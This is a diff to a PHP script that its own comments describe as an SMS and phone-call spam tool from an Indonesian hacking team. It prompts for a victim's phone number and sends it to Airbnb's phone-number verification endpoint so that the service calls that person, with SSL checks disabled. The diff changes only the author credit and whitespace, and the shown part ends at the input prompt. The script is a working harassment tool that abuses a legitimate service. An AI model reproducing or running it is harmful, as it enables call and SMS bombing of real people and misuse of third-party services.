@@ -1,9 +1,9 @@
 <?php
-// Copyright : Mr.Ghost-Name
+// Copyright : Ghost-Name
 // THANKS BY TEAM : 2E4H & ALL TEAM CYBER INDONESIA
 // INI ADALAH TOOLS SPAM SMS & TELPON
 function send($phone){
-$config['headers'] = explode("\n",'Host: www.airbnb.co.id
+$config['headers'] = explode("\n",'Host: www.airbnb.co.id
 Connection: keep-alive
 Content-Length: 66
 Origin: https://www.airbnb.co.id
@@ -22,14 +22,14 @@ $ch = curl_init();
         curl_setopt($ch, CURLOPT_URL, "https://www.airbnb.co.id/phone_numbers/create");
         curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
         curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_HEADER, false);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_HEADER, false);
         curl_setopt($ch, CURLOPT_HTTPHEADER, $config['headers']);
         curl_setopt($ch, CURLOPT_POST, 1);
         curl_setopt($ch, CURLOPT_POSTFIELDS, "phone_number=$phone&phone_type=call&phone_number_country=ID");
         $asw = curl_exec($ch);
         curl_close($ch);
-echo $server_output."\n";
+echo $server_output."\n";
 }
 echo "Korban Yang Mau Di Eue (Pake 62 jangan 0)\nInput : ";
 $nomor = trim(fgets(STDIN));
